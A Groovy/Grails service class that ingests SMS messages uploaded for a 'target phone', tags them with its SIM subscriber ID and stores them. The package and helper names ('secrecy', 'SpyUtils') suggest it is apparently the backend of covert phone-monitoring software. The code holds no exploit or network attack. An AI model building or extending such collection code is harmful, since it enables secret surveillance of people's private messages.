package com.atlancy.secrecy.services.helpers

import org.codehaus.jackson.map.DeserializationConfig
import org.codehaus.jackson.map.ObjectMapper
import org.codehaus.jackson.type.TypeReference
import org.springframework.dao.DuplicateKeyException

import com.atlancy.domain.Sms
import com.atlancy.domain.TargetPhone
import com.atlancy.secrecy.services.helpers.interfaces.ServiceInterface
import com.spy.tools.SpyUtils
import com.xaviar.market.rest.item.DataHolder
import com.xaviar.market.rest.item.DataHolderConstants

class SmsService implements ServiceInterface{

	@Override
	public Long getLastTs(String authSimSubscriberId) {
		List <Sms> smses = Sms.createCriteria().list{
			and {
				targetPhone{ eq("simSubscriberId", authSimSubscriberId) }
			}
			order("time","desc")
		};

		if(smses!=null && smses.size()>0){
			return smses.get(0).time.getTime();
		}else{
			return null;
		}
	}

	@Override
	public String getWishString(String authSimSubscriberId) {
		def smsTs = getLastTs(authSimSubscriberId);
		if(smsTs!=null){
			//TODO - change to SMS no need for different wish like SMS_EVENT it needs to be managed by timestamp only.
			return "\"" +DataHolderConstants.SMS_EVENT + "\":" + smsTs;
		}else{
			return "\"" +DataHolderConstants.SMS + "\":0";
		}
	}


	def addSmsEvents(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientSmsEvent = dataHolder.get(DataHolderConstants.SMS_EVENT);
		if (clientSmsEvent != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<Sms> smsEvents = mapper.readValue(clientSmsEvent,new TypeReference<List<Sms>>() {
					});
			smsEvents.each{
				try{
					it.id=it.id+"_"+targetPhone.simSubscriberId;
					it.targetPhone=targetPhone;
					if(it.address!=null){
						it.countryCode = SpyUtils.getCountryCode(it.address);
					}else{
						it.countryCode = "972";
					}
					//if(!Base64.isBase64(it.msg)){
					//it.msg = getEncodedString(it.msg);
					//	println getDecodedString(it.msg);
					//}
					it.recordOrigin="EVENT";
					it.recordState="CREATED";
					it.save(flush:true, failOnError:true,insert:true);
				}catch(DuplicateKeyException e){
					println "Duplicate Key Exception : " + it.id+"_"+targetPhone.simSubscriberId;
				}catch(Exception e){
					println ("*** ERROR *** " + it.address + " : " + it.msg);
					e.printStackTrace();
				}
			}
		}
	}

	def addSmses(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientSms = dataHolder.get(DataHolderConstants.SMS);
		if (clientSms != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<Sms> smses = mapper.readValue(clientSms,new TypeReference<List<Sms>>() {
					});

			smses.each{
				try{
					it.id=it.id+"_"+targetPhone.simSubscriberId;
					it.targetPhone=targetPhone;
					if(it.address!=null){
						it.countryCode = SpyUtils.getCountryCode(it.address);
					}else{
						it.countryCode = "972";
					}
					it.recordOrigin="ORIGINAL";
					it.recordState="CREATED";
					//if(!Base64.isBase64(it.msg)){
					//	it.msg = getEncodedString(it.msg);
					//	println getDecodedString(it.msg);
					//}
					it.save(flush:true, failOnError:true,insert:true);
				}catch(DuplicateKeyException e){
					println "Duplicate Key Exception : " + it.id+"_"+targetPhone.simSubscriberId;
				}catch(Exception e){
					println ("*** ERROR *** " + it.address + " : " + it.msg);
					e.printStackTrace();
				}
			}
		}
	}
}
